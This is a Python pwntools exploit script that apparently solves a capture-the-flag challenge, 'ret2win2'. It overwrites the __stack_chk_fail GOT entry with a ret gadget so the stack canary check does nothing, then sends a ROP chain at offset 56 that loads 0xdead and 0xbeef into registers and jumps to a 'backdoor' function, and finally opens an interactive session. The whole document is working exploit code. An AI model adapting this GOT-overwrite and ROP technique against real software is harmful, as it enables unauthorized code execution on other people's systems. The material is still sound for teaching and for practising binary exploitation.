#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2win2')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *feedback+140
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 56
    pop_rdi_rsi = 0x40139b
    ret = 0x40101a
    stack_chk = exe.got['__stack_chk_fail']
    
    io.recvuntil("feedback?")
    io.sendline("yes")

    io.recvuntil(".")
    io.send(p64(stack_chk))

    io.recvuntil("..")
    io.send(p64(ret))

    payload = flat({
        offset: [
            pop_rdi_rsi,
            0xdead,
            0xbeef,
            exe.sym['backdoor']
        ]
    })

    io.recvuntil("...")
    io.sendline(payload)

    io.interactive()



def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

